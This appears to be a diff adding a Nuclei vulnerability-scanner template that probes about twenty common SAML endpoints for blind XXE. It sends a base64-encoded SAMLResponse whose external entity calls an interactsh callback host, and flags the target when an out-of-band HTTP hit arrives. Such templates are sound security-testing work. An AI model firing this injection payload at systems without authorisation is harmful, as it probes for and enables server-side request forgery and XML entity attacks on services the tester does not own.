@@ -1,0 +1,47 @@
+id: saml-xxe-blind
+
+info:
+  name: SAML XXE Blind Detection
+  author: nuclei-templates
+  severity: critical
+  description: Détecte les vulnérabilités XXE blind dans les endpoints SAML via SAMLResponse
+  tags: saml,xxe,blind,ssrf
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/aveksa/main"
+      - "{{BaseURL}}/saml/acs"
+      - "{{BaseURL}}/saml/SSO"
+      - "{{BaseURL}}/sso/saml"
+      - "{{BaseURL}}/saml2/acs"
+      - "{{BaseURL}}/saml/acs/post"
+      - "{{BaseURL}}/saml/consume"
+      - "{{BaseURL}}/saml/login"
+      - "{{BaseURL}}/saml/response"
+      - "{{BaseURL}}/saml/assertion"
+      - "{{BaseURL}}/saml/validate"
+      - "{{BaseURL}}/saml/process"
+      - "{{BaseURL}}/sso/saml/acs"
+      - "{{BaseURL}}/sso/saml/SSO"
+      - "{{BaseURL}}/sso/saml2/acs"
+      - "{{BaseURL}}/idp/saml/acs"
+      - "{{BaseURL}}/idp/saml/SSO"
+      - "{{BaseURL}}/auth/saml/acs"
+      - "{{BaseURL}}/auth/saml/SSO"
+      - "{{BaseURL}}/login/saml/acs"
+      - "{{BaseURL}}/login/saml/SSO"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    body: "SAMLResponse={{base64_encode('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE samlp:Response [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]>')}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+        condition: and
